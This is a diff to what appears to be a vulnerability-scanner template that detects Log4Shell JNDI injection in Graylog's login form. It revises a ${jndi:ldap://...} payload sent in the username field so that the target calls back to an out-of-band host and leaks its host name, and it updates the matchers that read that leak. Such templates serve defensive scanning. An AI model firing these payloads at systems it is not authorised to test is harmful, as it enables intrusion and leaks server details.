@@ -19,6 +19,10 @@ info:
     verified: "true"
   tags: cve,cve2021,rce,jndi,log4j,graylog,kev,oast
 
+variables:
+  rand1: '{{rand_int(111, 999)}}'
+  rand2: '{{rand_int(111, 999)}}'
+
 http:
   - raw:
       - |
@@ -29,7 +33,7 @@ http:
         Origin: {{BaseURL}}
         Referer: {{BaseURL}}/login.jsp
 
-        username=${jndi:ldap://${sys:os.name}.{{interactsh-url}}}&password=admin&submit=
+        username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}}&password=admin&submit=
 
     matchers-condition: and
     matchers:
@@ -41,7 +45,7 @@ http:
       - type: regex
         part: interactsh_request
         regex:
-          - '([a-zA-Z0-9.-]+).([a-z0-9]+).([a-z0-9]+).\w+'  # Match for extracted ${sys:os.name} variable
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted ${:-{{rand1}}}${:-{{rand2}}}.${hostName} in output
 
       - type: word
         part: location
@@ -55,6 +59,12 @@ http:
 
       - type: regex
         part: interactsh_request
+        group: 2
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print injection point in output
+
+      - type: regex
+        part: interactsh_request
         group: 1
         regex:
-          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'  # Print extracted ${sys:os.name} in output
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted ${:-{{rand1}}}${:-{{rand2}}}.${hostName} in output
